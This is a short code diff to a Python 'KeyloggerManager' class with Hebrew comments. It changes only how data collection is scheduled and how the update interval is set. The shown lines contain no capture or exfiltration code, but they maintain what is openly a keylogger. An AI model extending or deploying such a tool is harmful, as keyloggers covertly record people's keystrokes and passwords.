@@ -48,10 +48,9 @@ class KeyloggerManager:
 # בודקת את הזמן
     def _schedule_collection(self) -> None:
         if self.is_running_flag:
-            now = datetime.now()
-            seconds_until_next_minute = 60 - now.second
-            self.timer = threading.Timer(seconds_until_next_minute, self._collect_and_process)
+            self.timer = threading.Timer(self.update_interval, self._collect_and_process)
             self.timer.start()
+
 
 # פונקציה שאוספת מידע
     def _collect_and_process(self) -> None:
@@ -119,7 +118,6 @@ class KeyloggerManager:
 
 # פונקציה שמעדכנת אם הזמן כל פעם שמשהו מתעדכן
     def update_interval_sec(self, new_interval: int) -> None:
-        new_interval = Config.UPDATE_INTERVAL
         if new_interval <= 0:
             raise ValueError("Interval must be positive")
         self.update_interval = new_interval
@@ -127,6 +125,7 @@ class KeyloggerManager:
         if self.is_running_flag and self.timer:
             self.timer.cancel()
             self._schedule_collection()
+
 
 # פונקציה שבודקת אם התוכנית פועלת
     def is_running(self) -> bool:
